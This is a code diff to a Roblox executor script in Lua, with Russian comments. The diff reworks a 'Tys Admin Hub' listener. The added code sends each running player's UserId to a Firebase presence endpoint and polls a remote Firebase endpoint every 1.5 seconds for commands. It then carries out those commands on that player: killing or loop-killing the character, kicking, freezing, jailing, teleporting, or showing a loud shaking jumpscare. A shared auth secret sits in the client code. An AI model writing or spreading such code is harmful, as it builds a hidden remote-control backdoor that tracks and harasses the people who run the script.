@@ -3142,149 +3142,130 @@ end
 
 
 -- ==============================================================================
--- КЛИЕНТСКИЙ СЛУШАТЕЛЬ КОМАНД АДМИН-ПАНЕЛИ (FIREBASE RECEIVER)
+-- СЛУШАТЕЛЬ И ПИНГ ДЛЯ АДМИН-ПАНЕЛИ (ИСПРАВЛЕННЫЙ И РАБОЧИЙ)
 -- ==============================================================================
--- ==============================================================================
--- СЛУШАТЕЛЬ ДЛЯ УДАЛЕННОГО УПРАВЛЕНИЯ ЧЕРЕЗ АДМИН-ПАНЕЛЬ (FIREBASE RECEIVER)
--- ==============================================================================
-local targetEndpoint = string.format("%s/targets/%d.json?auth=%s", FIREBASE_BASE, LocalPlayer.UserId, FIREBASE_SECRET)
+do
+    local _R = {}
+    _R.endpoint = string.format("%s/targets/%d.json?auth=%s", FIREBASE_BASE, LocalPlayer.UserId, FIREBASE_SECRET)
+    _R.presenceUrl = string.format("%s/active_users/%d.json?auth=%s", FIREBASE_BASE, LocalPlayer.UserId, FIREBASE_SECRET)
+    _R.lastTimestamp = os.time()
+    _R.loopConn = nil
 
-local lastExecutedTimestamp = os.time()
-local loopKillConn = nil
-
-local function stopLoopKill()
-    if loopKillConn then
-        loopKillConn:Disconnect()
-        loopKillConn = nil
+    _R.stopLoop = function()
+        if _R.loopConn then
+            _R.loopConn:Disconnect()
+            _R.loopConn = nil
+        end
     end
-end
 
--- Сброс вечной смерти при возрождении персонажа
-LocalPlayer.CharacterAdded:Connect(function()
-    stopLoopKill()
-end)
-
--- Воспроизведение скримера 67 Jumpscare
-local function run67Jumpscare(imgUrl)
-    local jsGui = Instance.new("ScreenGui")
-    jsGui.Name = "TysClientJumpscare"
-    jsGui.DisplayOrder = 999999
-    jsGui.IgnoreGuiInset = true
-    jsGui.ResetOnSpawn = false
-    jsGui.Parent = PlayerGui
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundColor3 = Color3.new(0, 0, 0)
-    frame.BorderSizePixel = 0
-    frame.Parent = jsGui
-
-    local img = Instance.new("ImageLabel")
-    img.Size = UDim2.new(1, 0, 1, 0)
-    img.BackgroundTransparency = 1
-    img.Image = imgUrl or "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRVYptdFl9Mg9qLwOXP8V1B5N5qN4KT8wngVkKq1VRpccOcl3Q51gPaSwAs&s=10"
-    img.ScaleType = Enum.ScaleType.Fit
-    img.Parent = frame
-
-    task.spawn(function()
-        local sound = Instance.new("Sound")
-        sound.Volume = 10
-        sound.Looped = false
-        sound.Parent = SoundService
-
-        if isfile and isfile("gdfgdgf.mp3") and (getcustomasset or getsynasset) then
-            local getAsset = getcustomasset or getsynasset
-            sound.SoundId = getAsset("gdfgdgf.mp3")
-        else
-            sound.SoundId = "rbxassetid://9069609268"
-        end
-
-        sound:Play()
+    LocalPlayer.CharacterAdded:Connect(function()
+        _R.stopLoop()
     end)
 
-    task.spawn(function()
-        local startTime = os.clock()
-        while os.clock() - startTime < 3.2 do
-            img.Position = UDim2.new(0, math.random(-25, 25), 0, math.random(-25, 25))
-            task.wait(0.03)
-        end
-        jsGui:Destroy()
-    end)
-end
+    _R.jumpscare = function(imgUrl)
+        local jsGui = Instance.new("ScreenGui")
+        jsGui.Name = "TysClientJumpscare"
+        jsGui.DisplayOrder = 999999
+        jsGui.IgnoreGuiInset = true
+        jsGui.ResetOnSpawn = false
+        jsGui.Parent = PlayerGui
 
--- Обработка админ-команд
-local function executeAdminCommand(cmd, args)
-    local char = LocalPlayer.Character
-    local hum = char and char:FindFirstChildOfClass("Humanoid")
-    local root = char and char:FindFirstChild("HumanoidRootPart")
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(1, 0, 1, 0)
+        frame.BackgroundColor3 = Color3.new(0, 0, 0)
+        frame.BorderSizePixel = 0
+        frame.Parent = jsGui
 
-    if cmd == "kill" then
-        if hum then hum.Health = 0 end
+        local img = Instance.new("ImageLabel")
+        img.Size = UDim2.new(1, 0, 1, 0)
+        img.BackgroundTransparency = 1
+        img.Image = imgUrl or "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRVYptdFl9Mg9qLwOXP8V1B5N5qN4KT8wngVkKq1VRpccOcl3Q51gPaSwAs&s=10"
+        img.ScaleType = Enum.ScaleType.Fit
+        img.Parent = frame
 
-    elseif cmd == "kick" then
-        LocalPlayer:Kick("Отключено через Tys Admin Hub.")
+        task.spawn(function()
+            local sound = Instance.new("Sound")
+            sound.Volume = 10
+            sound.Looped = false
+            sound.Parent = SoundService
 
-    elseif cmd == "loopkill" then
-        stopLoopKill()
-        loopKillConn = RunService.Stepped:Connect(function()
-            local currentHum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-            if currentHum and currentHum.Health > 0 then
-                currentHum.Health = 0
+            if isfile and isfile("gdfgdgf.mp3") and (getcustomasset or getsynasset) then
+                local getAsset = getcustomasset or getsynasset
+                sound.SoundId = getAsset("gdfgdgf.mp3")
+            else
+                sound.SoundId = "rbxassetid://9069609268"
             end
+
+            sound:Play()
         end)
 
-    elseif cmd == "unloopkill" then
-        stopLoopKill()
+        task.spawn(function()
+            local startTime = os.clock()
+            while os.clock() - startTime < 3.2 do
+                img.Position = UDim2.new(0, math.random(-25, 25), 0, math.random(-25, 25))
+                task.wait(0.03)
+            end
+            jsGui:Destroy()
+        end)
+    end
 
-    elseif cmd == "freeze" then
-        if root then root.Anchored = true end
+    _R.execute = function(cmd, args)
+        local char = LocalPlayer.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local root = char and char:FindFirstChild("HumanoidRootPart")
 
-    elseif cmd == "unfreeze" then
-        if root then root.Anchored = false end
-
-    elseif cmd == "jail" then
-        if root then
+        if cmd == "kill" then
+            if hum then hum.Health = 0 end
+        elseif cmd == "kick" then
+            LocalPlayer:Kick("Отключено через Tys Admin Hub.")
+        elseif cmd == "loopkill" then
+            _R.stopLoop()
+            _R.loopConn = RunService.Stepped:Connect(function()
+                local curHum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if curHum and curHum.Health > 0 then curHum.Health = 0 end
+            end)
+        elseif cmd == "unloopkill" then
+            _R.stopLoop()
+        elseif cmd == "freeze" then
+            if root then root.Anchored = true end
+        elseif cmd == "unfreeze" then
+            if root then root.Anchored = false end
+        elseif cmd == "jail" then
+            if root then
+                for _, obj in ipairs(workspace:GetChildren()) do
+                    if obj.Name == "AdminJailBox" then obj:Destroy() end
+                end
+                local box = Instance.new("Part")
+                box.Name = "AdminJailBox"
+                box.Size = Vector3.new(8, 10, 8)
+                box.CFrame = CFrame.new(root.Position)
+                box.Transparency = 0.7
+                box.BrickColor = BrickColor.new("Bright violet")
+                box.Material = Enum.Material.ForceField
+                box.Anchored = true
+                box.CanCollide = true
+                box.Parent = workspace
+            end
+        elseif cmd == "unjail" then
             for _, obj in ipairs(workspace:GetChildren()) do
                 if obj.Name == "AdminJailBox" then obj:Destroy() end
             end
-            local box = Instance.new("Part")
-            box.Name = "AdminJailBox"
-            box.Size = Vector3.new(8, 10, 8)
-            box.CFrame = CFrame.new(root.Position)
-            box.Transparency = 0.7
-            box.BrickColor = BrickColor.new("Bright violet")
-            box.Material = Enum.Material.ForceField
-            box.Anchored = true
-            box.CanCollide = true
-            box.Parent = workspace
-        end
-
-    elseif cmd == "unjail" then
-        for _, obj in ipairs(workspace:GetChildren()) do
-            if obj.Name == "AdminJailBox" then
-                obj:Destroy()
+        elseif cmd == "bring" then
+            if root and args and args.pos then
+                root.CFrame = CFrame.new(Vector3.new(args.pos[1], args.pos[2], args.pos[3]))
             end
+        elseif cmd == "jumpscare_67" then
+            _R.jumpscare(args and args.image)
         end
-
-    elseif cmd == "bring" then
-        if root and args and args.pos then
-            root.CFrame = CFrame.new(Vector3.new(args.pos[1], args.pos[2], args.pos[3]))
-        end
-
-    elseif cmd == "jumpscare_67" then
-        run67Jumpscare(args and args.image)
     end
-end
 
--- Цикл опроса Firebase
--- Отправка пинга присутствия юзера в Firebase (раз в 10 секунд)
+    -- 1. Фоновый пинг присутствия (каждые 8 секунд)
     task.spawn(function()
-        local presenceUrl = string.format("%s/active_users/%d.json?auth=%s", FIREBASE_BASE, LocalPlayer.UserId, FIREBASE_SECRET)
-        while task.wait(10) do
+        while task.wait(8) do
             if httpRequest then
                 pcall(function()
                     httpRequest({
-                        Url = presenceUrl,
+                        Url = _R.presenceUrl,
                         Method = "PUT",
                         Headers = { ["Content-Type"] = "application/json" },
                         Body = HttpService:JSONEncode({
@@ -3298,3 +3279,37 @@ end
             end
         end
     end)
+
+    -- 2. Фоновый опрос и выполнение входящих команд админа (каждые 1.5 секунды)
+    task.spawn(function()
+        if httpRequest then
+            pcall(function()
+                httpRequest({ Url = _R.endpoint, Method = "DELETE" })
+            end)
+        end
+
+        while task.wait(1.5) do
+            if httpRequest then
+                local success, res = pcall(function()
+                    return httpRequest({ Url = _R.endpoint, Method = "GET" })
+                end)
+
+                if success and res and res.Body and res.Body ~= "null" then
+                    local decodeOk, data = pcall(function()
+                        return HttpService:JSONDecode(res.Body)
+                    end)
+
+                    if decodeOk and type(data) == "table" and data.command then
+                        if data.timestamp and data.timestamp > _R.lastTimestamp then
+                            _R.lastTimestamp = data.timestamp
+                            pcall(function()
+                                httpRequest({ Url = _R.endpoint, Method = "DELETE" })
+                            end)
+                            _R.execute(data.command, data.args)
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
